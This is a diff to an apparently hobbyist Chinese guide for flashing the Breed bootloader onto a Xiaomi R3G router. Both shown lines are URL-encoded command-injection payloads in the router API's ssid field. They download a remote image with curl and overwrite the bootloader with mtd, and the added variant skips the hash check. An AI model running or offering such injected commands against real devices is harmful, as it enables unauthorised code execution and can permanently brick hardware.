@@ -78,6 +78,16 @@ python -m http.server 9003
 http://192.168.31.1/cgi-bin/luci/;stok=16742c3b021146a8bcd4e58ac528b805/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=%0Acd%20%2Ftmp%0Acurl%20-o%20B%20-O%20http%3A%2F%2Fip%3A8080%2Fbreed-mt7621-xiaomi-r3g.bin%20-k%20-g%0A%5B%20-z%20%22%24(sha256sum%20B%20%7C%20grep%20242d42eb5f5aaa67ddc9c1baf1acdf58d289e3f792adfdd77b589b9dc71eff85)%22%20%5D%20%7C%7C%20mtd%20-r%20write%20B%20Bootloader%0A
 ```
 
+后续在论坛上还找到别的
+
+```shell
+http://192.168.31.1/cgi-bin/luci/;stok=CCCCCCCCCCC/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=%0Acd%20%2Ftmp%0Acurl%20-o%20B%20https%3A%2F%2Fbreed.hackpascal.net%2Fr1416%2520%255b2022-07-24%255d%2Fbreed-mt7621-xiaomi-r3g.bin%20-k%20-g%0Amtd%20-r%20write%20B%20Bootloader%0A
+```
+
+
+
+
+
 
 
 #### 查看刷写breed结果
